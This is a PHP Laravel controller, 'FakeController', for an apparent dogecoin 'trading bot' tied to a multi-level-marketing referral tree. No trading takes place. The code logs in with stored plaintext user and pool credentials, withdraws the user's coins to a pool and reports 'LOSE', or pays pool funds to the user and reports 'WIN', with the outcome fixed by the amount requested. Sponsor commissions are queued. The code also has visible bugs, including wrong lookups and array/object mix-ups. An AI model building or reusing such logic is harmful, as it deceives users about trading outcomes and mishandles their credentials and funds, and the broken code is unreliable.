<?php

namespace App\Http\Controllers\API\Bot;

use App\Events\TredingEvent;
use App\Http\Controllers\Controller;
use App\Http\Controllers\HttpController;
use App\Http\Controllers\ToolController;
use App\Models\Bank;
use App\Models\Binary;
use App\Models\BuyWall;
use App\Models\CoinAuth;
use App\Models\IT;
use App\Models\Queue;
use App\Models\Setting;
use Carbon\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\ValidationException;

class FakeController extends Controller
{
  protected $user;
  protected $coinAuth;
  protected $bank;
  protected $shareIT;
  protected $shareBuyWall;

  /**
   * FakeController constructor.
   */
  public function __construct()
  {
    $this->user = Auth::user();
    $this->coinAuth = CoinAuth::find($this->user);
    $this->bank = Bank::find(1);
    $this->shareIT = IT::find(1);
    $this->shareBuyWall = BuyWall::find(1);
  }

  /**
   * @param Request $request
   * @return JsonResponse
   * @throws ValidationException
   */
  public function index(Request $request): JsonResponse
  {
    if ($this->user->trade_fake === Carbon::now()) {
      return response()->json(['message' => 'Already trade today'], 500);
    }

    $setting = Setting::find(1);
    $this->validate($request, [
      'balance' => 'required|numeric|min:' . $setting->min_bot . '|max:' . $setting->max_bot,
    ]);

    if (!$this->coinAuth->cookie) {
      $this->coinAuth->cookie = self::getCookie($this->coinAuth->username, $this->coinAuth->password);
      if ($this->coinAuth->cookie !== "break") {
        $this->coinAuth->save();
      }
    }

    if (!$this->bank->cookie) {
      $this->bank->cookie = self::getCookie($this->bank->username, $this->bank->password);
      if ($this->bank->cookie !== "break") {
        $this->bank->save();
      }
    }

    if (!$this->shareIT->cookie) {
      $this->shareIT->cookie = self::getCookie($this->shareIT->username, $this->shareIT->password);
      if ($this->shareIT->cookie !== "break") {
        $this->shareIT->save();
      }
    }

    if (!$this->shareBuyWall->cookie) {
      $this->shareBuyWall->cookie = self::getCookie($this->shareBuyWall->username, $this->shareBuyWall->password);
      if ($this->shareBuyWall->cookie !== "break") {
        $this->shareBuyWall->save();
      }
    }

    $balancePool = self::getBalance($this->bank->cookie);
    if ($balancePool->code === 200) {
      if ($request->balance > ($balancePool->balance - Queue::where('send', false)->sum('value')) || $request->balance < (1000 * 10 ** 8)) {
        $data = [
          's' => $this->coinAuth->cookie,
          'Amount' => $request->balance,
          'Address' => $balancePool->wallet,
          'Currency' => 'doge'
        ];
        $post = HttpController::post('Withdraw', $data);
        if ($post['code'] === 200) {
          $getPrice = HttpController::dogePrice();
          if ($getPrice['code'] === 200) {
            $balance = number_format($request->balance / 10 ** 8, 8, '.', '');
            $receiveTicket = ($getPrice['data'] * $balance) / 500000;
            ToolController::loseBot($this->user->id, $receiveTicket);

            $this->user->trade_fake = Carbon::now();
            $this->user->save();

            $bot_one = $this->user->trade_real == Carbon::now();
            $bot_two = $this->user->trade_real == Carbon::now();
            event(new TredingEvent(Auth::user()->username, $bot_one, $bot_two));

            return response()->json(['message' => "LOSE"]);
          }

          return response()->json(['message' => $getPrice->message], 500);
        }

        return response()->json(['message' => $post->message], 500);
      }

      $shareIt = $balancePool->balance * Setting::find()->it;
      $buyWall = $balancePool->balance * Setting::find()->buy_wall;
      $sponsor = $balancePool->balance * Setting::find()->sponsor;
      $remainingBalance = $balancePool->balance - ($shareIt + $buyWall + $sponsor);

      $post = HttpController::post('Withdraw', [
        's' => $this->bank->cookie,
        'Amount' => $remainingBalance,
        'Address' => $this->coinAuth->wallet,
        'Currency' => 'doge'
      ]);

      if ($post['code'] === 200) {
        $queue = new Queue();
        $queue->type = 'it';
        $queue->user_id = 1;
        $queue->value = $shareIt;
        $queue->send = false;
        $queue->save();

        $queue = new Queue();
        $queue->type = 'buy_wall';
        $queue->user_id = 1;
        $queue->value = $buyWall;
        $queue->send = false;
        $queue->save();

        $queue = new Queue();
        $queue->type = 'sponsor';
        $queue->user_id = Binary::where('down_line', $this->user->id)->first()->sponsor;
        $queue->value = $sponsor;
        $queue->send = false;
        $queue->save();

        $this->user->trade_fake = Carbon::now();
        $this->user->save();

        $bot_one = $this->user->trade_real == Carbon::now();
        $bot_two = $this->user->trade_real == Carbon::now();
        event(new TredingEvent(Auth::user()->username, $bot_one, $bot_two));

        return response()->json(['message' => "WIN"]);
      }

      return response()->json(['message' => "access rejected. you can try again"]);
    }

    return response()->json(['message' => $balancePool->message], 500);
  }

  /**
   * @param $cookie
   * @return array
   */
  public static function getBalance($cookie): array
  {
    $data = [
      's' => $cookie,
      'Currency' => 'doge'
    ];

    $post = HttpController::post('GetBalance', $data);
    if ($post['code'] === 200) {
      return [
        'code' => 200,
        'message' => 'success load balance',
        'balance' => $post['data']['Balance'],
      ];
    }

    return [
      'code' => 500,
      'message' => 'failed load balance',
      'balance' => 0,
    ];
  }

  /**
   * @param $username
   * @param $password
   * @return string
   */
  private static function getCookie($username, $password): string
  {
    $data = [
      'username' => $username,
      'password' => $password,
    ];
    $post = HttpController::post("Login", $data, true);
    if ($post['code'] === 200) {
      return $post['data']['SessionCookie'];
    }
    return "break";
  }
}
